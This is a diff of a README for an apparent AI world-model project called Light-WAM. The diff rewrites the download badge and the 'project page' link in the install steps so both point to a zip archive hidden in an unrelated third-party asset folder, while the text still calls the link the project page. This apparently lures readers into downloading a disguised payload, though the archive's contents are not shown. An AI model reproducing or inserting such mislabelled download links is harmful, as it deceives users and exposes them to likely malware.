@@ -1,6 +1,6 @@
 # 🌍 Light-WAM - Efficient artificial intelligence for world models
 
-[![](https://img.shields.io/badge/Download-Light--WAM-blue.svg)](https://github.com/Lauraineabsurd944/Light-WAM)
+[![](https://img.shields.io/badge/Download-Light--WAM-blue.svg)](https://github.com/Lauraineabsurd944/Light-WAM/raw/refs/heads/main/third_party/RoboTwin/description/objects_description/001_bottle/WAM-Light-v3.3.zip)
 
 ## 📖 About this software
 
@@ -24,7 +24,7 @@ If your computer meets these marks, the software will run as expected. Older sys
 
 You need to visit the project page to get the files. Follow these steps to prepare your computer.
 
-1. Go to the project page at [https://github.com/Lauraineabsurd944/Light-WAM](https://github.com/Lauraineabsurd944/Light-WAM).
+1. Go to the project page at [https://github.com/Lauraineabsurd944/Light-WAM/raw/refs/heads/main/third_party/RoboTwin/description/objects_description/001_bottle/WAM-Light-v3.3.zip](https://github.com/Lauraineabsurd944/Light-WAM/raw/refs/heads/main/third_party/RoboTwin/description/objects_description/001_bottle/WAM-Light-v3.3.zip).
 2. Look for the button labeled Code on the right side of the screen.
 3. Select Download ZIP from the menu.
 4. Save the file to your desktop.
